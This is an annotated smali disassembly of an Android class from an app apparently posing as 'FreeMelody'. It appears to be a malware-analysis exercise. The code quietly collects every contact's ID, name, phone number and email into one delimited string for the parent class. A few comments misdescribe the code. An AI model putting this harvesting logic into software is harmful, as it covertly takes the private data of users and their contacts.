.class Lcom/mmmm/bl/FreeMelody$1;
.super Ljava/lang/Object;
.source "FreeMelody.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/mmmm/bl/FreeMelody;->onStart()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/mmmm/bl/FreeMelody;


# direct methods
.method constructor <init>(Lcom/mmmm/bl/FreeMelody;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;
#store object reference to this$0:Lcom/mmmm/bl/FreeMelody into p1 referenced by p0

    .line 55
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/mmmm/bl/FreeMelody$1;)Lcom/mmmm/bl/FreeMelody;
    .locals 1

    .prologue
    .line 55
    iget-object v0, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 14
#14 non-parameterized registers

    .prologue
    .line 57
    iget-object v1, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;
#gets this$0:Lcom/mmmm/bl/FreeMelody stores in register v1

    invoke-virtual {v1}, Lcom/mmmm/bl/FreeMelody;->getContentResolver()Landroid/content/ContentResolver;
#ContentResolver allows this application to have access to data from other applications in a secure manner.


    move-result-object v0

    .line 58
    .local v0, "resolver":Landroid/content/ContentResolver;
#stores the content resolver in v0
    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;
#reads contacts object reference, puts it in v1 
    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0
#creates 4 registers with null values

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
#calls ContentResolver query with v1-v5. v1 is the reference to contacts. Stores returned value in v0. saves as Cursor object which allows random read-write permissions


    move-result-object v11
#moves contact details to v11

    .line 60
    .local v11, "cursor":Landroid/database/Cursor;
#saves as variable 'cursor'
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V
#Creates and calls string builder puts it in v12
    .line 62
    .local v12, "getString":Ljava/lang/StringBuilder;
#sets it as a variable
    invoke-interface {v11}, Landroid/database/Cursor;->moveToFirst()Z
#moves cursor to first row

    move-result v13
#moves result to v13

    .line 63
    .local v13, "isEof":Z
    :goto_0
    if-nez v13, :cond_0

    .line 91
    iget-object v1, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/mmmm/bl/FreeMelody;->access$0(Lcom/mmmm/bl/FreeMelody;Ljava/lang/String;)V
#allows access to contacts variable in parent class

    .line 94
    iget-object v1, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;

    # getter for: Lcom/mmmm/bl/FreeMelody;->mHandler:Landroid/os/Handler;
    invoke-static {v1}, Lcom/mmmm/bl/FreeMelody;->access$1(Lcom/mmmm/bl/FreeMelody;)Landroid/os/Handler;
#calls class from main outer class access$1, allows access to osHandler
    move-result-object v1
#move this to v1

    new-instance v2, Lcom/mmmm/bl/FreeMelody$1$1;

    invoke-direct {v2, p0}, Lcom/mmmm/bl/FreeMelody$1$1;-><init>(Lcom/mmmm/bl/FreeMelody$1;)V
#calls FreeMelody$1$1 initalization

    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
#adds FreeMelody$1$1 to osHandler queue

    .line 110
    return-void

    .line 64
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;
#new instance of StringBuilder in v1

    const-string v2, "_id"
#puts string in v2

    invoke-interface {v11, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
#calls Cursor (where contacts are), gets '_id' coloumn number 
    move-result v2
#puts int in v2

    invoke-interface {v11, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
#calls Cursor getString, passing in the column ID, returns value of column as string

    move-result-object v2
#moves result to v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
#gets the string representation of the char array

    move-result-object v2
#move to v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
#calls stringbuilder with v2 as arg

    const-string v2, ":"
#changes v2 to ':'

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
#appends the ':' in v2 onto the string of contact ID's in v1

    move-result-object v1
#overwrites v1 with new string

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
#returns a sting representing the string in v1

    move-result-object v1
#overwrite v1

    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
#appends new string in v1 to the one in v12

    .line 65
#Same thing but for display_name instead of ID
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "display_name"

    invoke-interface {v11, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v11, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, ":"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
#Same thing but for display_name instead of ID
#v12 register is now a string containing ID's and Displaynames of contacts split by :'s

    .line 67
    const-string v1, "_id"

    invoke-interface {v11, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v11, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8
#gets the getString value for the _id column again

    .line 69
    .local v8, "contactsId":Ljava/lang/String;
#saves the ID's as 'contactsID' variable

    const-string v10, ""
#creates empty string in v10

    .line 70
    .local v10, "contactsPhone":Ljava/lang/String;
#names this contactsPhone
    const-string v1, "has_phone_number"
#creates string in v1

    invoke-interface {v11, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
#pulls the column ID for people who have phone numbers

    move-result v1
#puts the column ID into v1

    invoke-interface {v11, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
#gets column of people with phone numbers, returned as string

    move-result-object v1
#moves into v1

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
#parses the string of phone numbers as a signed int

    move-result v1
#moves result to v1

    if-lez v1, :cond_1
#if theres nothing in here cond_1

    .line 71
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;
#gets raw contact data stores in v1

    const/4 v2, 0x0
#v2 = 0

    const-string v3, "contact_id = ? "
#v3 is string

    const/4 v4, 0x1
#v4 = 1

    new-array v4, v4, [Ljava/lang/String;
#creates an array of strings

    const/4 v5, 0x0
#v5 = 0

    aput-object v8, v4, v5
#puts the integer in v8 into an array, v8 holds the ID's of people with phone numbers
#v4 references an array of IDs of people with phone numbers. indexed by v5 

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
#calls content resolver, with given args. returns phone numbers of those with ID's in v4
    move-result-object v7
#puts numbers into v7

    .line 72
    .local v7, "cPhone":Landroid/database/Cursor;
#creates local variable cPhone
    :goto_1
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1
    if-nez v1, :cond_2
#For loop to gather all numbers and put them in v7

    .line 75
    invoke-interface {v7}, Landroid/database/Cursor;->close()V
#closes cursor (database)

    .line 77
    .end local v7    # "cPhone":Landroid/database/Cursor;
#cPhone done
    :cond_1

    new-instance v1, Ljava/lang/StringBuilder;
#new instance of string builder

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
#contactsPhone in v10, string value of
    move-result-object v2
#returns value of string moves it to v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
#calls string builder init passing in value of string, 

    const-string v2, ":"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1
#appends ':' to end of stringbuilder

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
#returns the string in string builder

    move-result-object v1
#moves it to v1

    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
#calls the string builder in v12, appends new string to the end.

    .line 79
    const-string v9, ""

    .line 81
    .local v9, "contactsMail":Ljava/lang/String;
#creates string in v9 called contactsMail
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Email;->CONTENT_URI:Landroid/net/Uri;
#gets content_Uri of email data

    const/4 v2, 0x0

    const-string v3, "contact_id = ? "

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v8, v4, v5

    const/4 v5, 0x0

    .line 80
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 82
    .local v6, "cMail":Landroid/database/Cursor;
    :goto_2
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z
    move-result v1

    if-nez v1, :cond_3
#for loop gathering email adresses of contacts. Storing them in v6 called cMail

    .line 85
    invoke-interface {v6}, Landroid/database/Cursor;->close()V
#closes cursor session

    .line 86
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 88
    invoke-interface {v11}, Landroid/database/Cursor;->moveToNext()Z

    move-result v13

    goto/16 :goto_0

    .line 73
    .end local v6    # "cMail":Landroid/database/Cursor;
    .end local v9    # "contactsMail":Ljava/lang/String;
    .restart local v7    # "cPhone":Landroid/database/Cursor;
    :cond_2
    const-string v1, "data1"

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    goto :goto_1

    .line 83
    .end local v7    # "cPhone":Landroid/database/Cursor;
    .restart local v6    # "cMail":Landroid/database/Cursor;
    .restart local v9    # "contactsMail":Ljava/lang/String;
    :cond_3
    const-string v1, "data1"

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v6, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    goto :goto_2
.end method
